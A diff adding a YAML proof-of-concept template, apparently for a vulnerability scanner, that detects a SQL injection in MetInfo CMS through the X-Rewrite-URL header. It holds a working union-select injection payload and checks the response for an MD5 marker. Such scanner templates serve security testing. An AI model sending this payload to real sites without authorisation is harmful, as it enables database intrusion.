@@ -1,0 +1,21 @@
+name: poc-yaml-metinfo-x-rewrite-url-sqli
+manual: true
+transport: http
+set:
+    r1: randomInt(40000, 44800)
+    r2: randomInt(40000, 44800)
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /index.php?lang=Cn&index=1
+            headers:
+                X-Rewrite-URL: 1/2/404xxx' union select md5({{r1}}),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#/index.php
+            follow_redirects: false
+        expression: response.headers["Location"].contains(md5(string(r1)))
+expression: r0()
+detail:
+    author: sharecast
+    links:
+        - https://www.leavesongs.com/PENETRATION/metinfo-5.3.17-sql-injection.html
